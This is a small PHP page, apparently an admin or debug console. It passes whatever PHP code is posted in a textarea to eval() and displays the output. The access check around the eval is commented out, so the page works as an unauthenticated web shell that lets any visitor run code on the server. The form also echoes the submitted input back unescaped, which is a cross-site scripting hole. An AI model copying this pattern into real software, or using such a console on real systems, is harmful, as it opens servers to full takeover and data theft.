
<html>
<body>
<?php

include('func.php');

//if ($account['type'] != 'admin') {
	//echo 'not admin';
//} else if(!empty($_POST['command'])) {
	echo '<pre>';
	$result = eval($_POST['command']);
	echo htmlspecialchars($result);
	echo '</pre>';
//}

?>
	<hr>
	<form action='<?php echo $_SERVER['PHP_SELF']; ?>' method='post'>
		<textarea rows='30' cols='80' name='command' id='command'><?php echo $_POST['command'] ?></textarea>
		<br/>
		<input type='submit' name='submit'>
	</form>
</body>
</html>